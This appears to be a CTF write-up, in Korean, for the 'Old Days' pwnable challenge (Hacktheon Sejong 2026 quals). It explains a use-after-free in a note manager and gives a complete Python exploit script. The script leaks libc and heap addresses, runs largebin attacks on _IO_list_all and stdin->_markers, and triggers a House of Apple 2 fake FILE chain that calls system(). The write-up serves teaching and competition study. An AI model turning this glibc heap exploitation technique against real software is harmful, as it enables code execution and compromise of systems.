---
title: "Hacktheon Sejong 2026 Quals Old Days Writeup"
published: 2026-04-28
description: "Hacktheon Sejong 2026 Quals Old Days 문제 풀이."
category: "CTF/Wargame"
tags: ["Hacktheon Sejong", "CTF", "Writeup", "Pwnable"]
draft: false
listed: false
---

# Old Days

### Summary

note manager가 `delete` 이후 pointer와 size를 지우지 않아서 UAF가 난다. UAF read로 libc와 heap을 잡고 largebin attack으로 `_IO_list_all`과 `stdin->_markers`를 차례로 오염시켜 exit flush에서 fake FILE chain을 태웠다.

### Analysis

freed large chunk를 다시 읽으면 unsorted bin fd에서 `main_arena`가 새고 largebin chunk의 `fd_nextsize` self pointer로 heap base도 계산할 수 있다. leak이 잡힌 뒤에는 stdin pipe를 nonblocking으로 바꿔 slot에 잡히지 않는 live chunk를 만들었다.

원격에서는 setuid-root 바이너리라 외부 signal을 보내는 식의 trigger를 쓸 수 없었다. 대신 프로그램 안의 SIGSEGV handler를 이용했다. handler는 특정 상태에서 `exit(1)`을 호출하므로, 내부에서 SIGSEGV를 만들면 `exit` flush까지 자연스럽게 이어진다.

FSOP 쪽은 `_IO_list_all`에 fake FILE을 연결하고 wide data/vtable을 House of Apple 2 흐름에 맞췄다. 마지막으로 largebin attack으로 `stdin->_markers`를 잘못된 chunk로 돌려두면 다음 입력 처리 중 marker를 따라가다 SIGSEGV가 터진다.

흐름은 아래처럼 이어진다.

```text
UAF read
  -> libc leak / heap leak
  -> largebin attack(_IO_list_all)
  -> fake FILE chain
  -> largebin attack(stdin->_markers)
  -> scanf/getchar internal SIGSEGV
  -> exit flush
  -> system("cat flag")
```

### Exploit

```python
#!/usr/bin/env python3
from pwn import *
import os, fcntl, select, time, sys

context.binary = exe = ELF('./deploy/prob', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = './ld-linux-x86-64.so.2'

class PipeProc:
    def __init__(self, argv):
        self.rin, self.win = os.pipe()
        self.rout, self.wout = os.pipe()
        self.buf = b''
        pid = os.fork()
        if pid == 0:
            os.dup2(self.rin, 0)
            os.dup2(self.wout, 1)
            os.dup2(self.wout, 2)
            for fd in (self.rin, self.win, self.rout, self.wout):
                try: os.close(fd)
                except OSError: pass
            os.execv(argv[0], argv)
        self.pid = pid
        os.close(self.wout)
        self.orig_flags = fcntl.fcntl(self.rin, fcntl.F_GETFL)

    def set_nb(self, enabled):
        flags = self.orig_flags | (os.O_NONBLOCK if enabled else 0)
        fcntl.fcntl(self.rin, fcntl.F_SETFL, flags)

    def send(self, data):
        os.write(self.win, data)

    def _read_some(self, timeout):
        r, _, _ = select.select([self.rout], [], [], timeout)
        if not r:
            return b''
        data = os.read(self.rout, 4096)
        if not data:
            raise EOFError(self.buf[-200:])
        self.buf += data
        return data

    def recvuntil(self, pat, timeout=5):
        end = time.time() + timeout
        while pat not in self.buf:
            left = end - time.time()
            if left <= 0:
                raise TimeoutError((pat, self.buf[-300:]))
            self._read_some(left)
        i = self.buf.index(pat) + len(pat)
        out = self.buf[:i]
        self.buf = self.buf[i:]
        return out

    def recvn(self, n, timeout=5):
        end = time.time() + timeout
        while len(self.buf) < n:
            left = end - time.time()
            if left <= 0:
                raise TimeoutError((n, self.buf[-300:]))
            self._read_some(left)
        out = self.buf[:n]
        self.buf = self.buf[n:]
        return out

    def recvall(self, timeout=5):
        out = self.buf
        self.buf = b''
        end = time.time() + timeout
        while True:
            left = max(0, end - time.time())
            if left == 0:
                break
            try:
                d = self._read_some(left)
                if d:
                    out += self.buf
                    self.buf = b''
            except EOFError:
                out += self.buf
                self.buf = b''
                break
        return out


def start():
    return PipeProc([ld, '--library-path', '.', './deploy/prob'])


def wait_prompt(p):
    p.recvuntil(b'Choice: ')


def menu(p, choice):
    p.send(str(choice).encode() + b'\n')


def create(p, idx, size, data=b'X'):
    menu(p, 1)
    p.recvuntil(b'Index')
    p.send(str(idx).encode() + b'\n')
    p.recvuntil(b'Size')
    p.send(str(size).encode() + b'\n')
    p.recvuntil(b'Content: ')
    p.send(data)
    wait_prompt(p)


def alloc_fail(p, idx, size):
    menu(p, 1)
    p.recvuntil(b'Index')
    p.send(str(idx).encode() + b'\n')
    p.recvuntil(b'Size')
    p.set_nb(True)
    p.send(str(size).encode() + b'\n')
    p.recvuntil(b'Content: ')
    p.recvuntil(b'Choice: ', timeout=2)
    p.set_nb(False)
    p.send(b'\n')
    wait_prompt(p)


def read_raw(p, idx, size):
    menu(p, 2)
    p.recvuntil(b'Index')
    p.send(str(idx).encode() + b'\n')
    p.recvuntil(f'Note[{idx}]: '.encode())
    data = p.recvn(size)
    p.recvuntil(b'Choice: ')
    return data


def edit(p, idx, data):
    menu(p, 3)
    p.recvuntil(b'Index')
    p.send(str(idx).encode() + b'\n')
    p.recvuntil(b'New content: ')
    p.send(data)
    wait_prompt(p)


def delete(p, idx):
    menu(p, 4)
    p.recvuntil(b'Index')
    p.send(str(idx).encode() + b'\n')
    wait_prompt(p)


def build_fake_file(p2_user, libc_base):
    payload = bytearray(0x418)
    fake2 = p2_user + 0x100
    wide = p2_user + 0x220
    wide_vtable = p2_user + 0x320
    lock = p2_user + 0x3D0

    def hfield(off, val):
        payload[off - 0x10:off - 0x08] = p64(val)

    hfield(0x20, 0)
    hfield(0x28, 0)
    hfield(0x68, fake2)
    hfield(0x88, lock)
    payload[0xC0 - 0x10:0xC0 - 0x0C] = p32(0)

    o = fake2 - p2_user
    cmd = b' cat flag;cat deploy/flag\x00'
    payload[o:o+len(cmd)] = cmd

    def ffield(off, val):
        payload[o + off:o + off + 8] = p64(val)

    ffield(0x20, 0)
    ffield(0x28, 1)
    ffield(0x68, 0)
    ffield(0x88, lock)
    ffield(0xA0, wide)
    payload[o + 0xC0:o + 0xC4] = p32(0)
    ffield(0xD8, libc_base + libc.sym['_IO_wfile_jumps'])
    payload[0x220 + 0xE0:0x220 + 0xE8] = p64(wide_vtable)
    payload[0x320 + 0x68:0x320 + 0x70] = p64(libc_base + libc.sym['system'])
    return bytes(payload)


def build_fake_file_with_largebin_meta(p2_user, libc_base, meta):
    payload = bytearray(build_fake_file(p2_user, libc_base))

    payload[0:0x20] = meta[:0x20]

    fake2 = p2_user + 0x100
    lock = p2_user + 0x3D0
    wide0 = p2_user + 0x3A0

    def hfield(off, val):
        payload[off - 0x10:off - 0x08] = p64(val)

    hfield(0x68, fake2)
    hfield(0x88, lock)
    hfield(0xA0, wide0)
    payload[0xC0 - 0x10:0xC0 - 0x0C] = p32(1)
    return bytes(payload)


def main():
    p = start()
    wait_prompt(p)

    create(p, 0, 0x468, b'A')
    alloc_fail(p, 6, 0x18)
    create(p, 1, 0x458, b'B')
    alloc_fail(p, 6, 0x18)
    create(p, 2, 0x448, b'C')
    alloc_fail(p, 6, 0x18)
    create(p, 3, 0x438, b'D')
    alloc_fail(p, 6, 0x18)

    delete(p, 0)
    libc_base = u64(read_raw(p, 0, 8)) - 0x203B20
    log.info(f'libc_base = {libc_base:#x}')

    alloc_fail(p, 6, 0x478)
    p1_meta = read_raw(p, 0, 0x20)
    p1_user = u64(p1_meta[0x10:0x18])
    if (p1_user & 0xf) == 0:
        p1_hdr = p1_user
        p1_user = p1_hdr + 0x10
    else:
        p1_hdr = p1_user - 0x10
    if p1_hdr == 0 or (p1_hdr >> 40) == 0:
        raise RuntimeError('bad p1 leak')
    p2_user = p1_user + 0x470 + 0x20
    log.info(f'p1_user = {p1_user:#x}, p2_user = {p2_user:#x}')

    delete(p, 1)
    meta = bytearray(read_raw(p, 0, 0x20))
    meta[0x18:0x20] = p64(libc_base + libc.sym['_IO_list_all'] - 0x20)
    edit(p, 0, bytes(meta))
    alloc_fail(p, 6, 0x478)

    p3_user = p2_user + 0x460 + 0x20
    p4_user = p3_user + 0x450 + 0x20
    log.info(f'p3_user ~= {p3_user:#x}')

    delete(p, 2)
    p4_hdr = p4_user - 0x10
    meta1 = bytearray(read_raw(p, 0, 0x20))
    meta1[0x18:0x20] = p64(p4_hdr - 0x20)
    edit(p, 0, bytes(meta1))
    alloc_fail(p, 6, 0x478)

    delete(p, 3)
    meta2 = read_raw(p, 1, 0x20)
    edit(p, 1, build_fake_file_with_largebin_meta(p2_user, libc_base, meta2))

    target2 = libc_base + libc.sym['_IO_2_1_stdin_'] + 0x60
    meta1 = bytearray(read_raw(p, 0, 0x20))
    meta1[0x18:0x20] = p64(target2 - 0x20)
    edit(p, 0, bytes(meta1))

    menu(p, 1)
    p.recvuntil(b'Index')
    p.send(b'6\n')
    p.recvuntil(b'Size')
    p.set_nb(True)
    p.send(b'1144\n')
    p.recvuntil(b'Content: ')
    p.recvuntil(b'Choice: ', timeout=2)
    p.set_nb(False)
    p.send(b'\n')
    for _ in range(32):
        p.send(b'1\n123456789012345678901234567890x\n')
        p.send(b'2\n123456789012345678901234567890x\n')
        p.send(b'3\n123456789012345678901234567890x\n')
        p.send(b'4\n123456789012345678901234567890x\n')
        p.send(b'123456789012345678901234567890x\n')
        time.sleep(0.02)
    out = p.recvall(timeout=5)
    sys.stdout.buffer.write(out)
    try:
        os.waitpid(p.pid, 0)
    except ChildProcessError:
        pass

if __name__ == '__main__':
    main()
```

### Flag

`hacktheon2026{o1d-d4y5_g1ibc_exp10it4ti0n}`
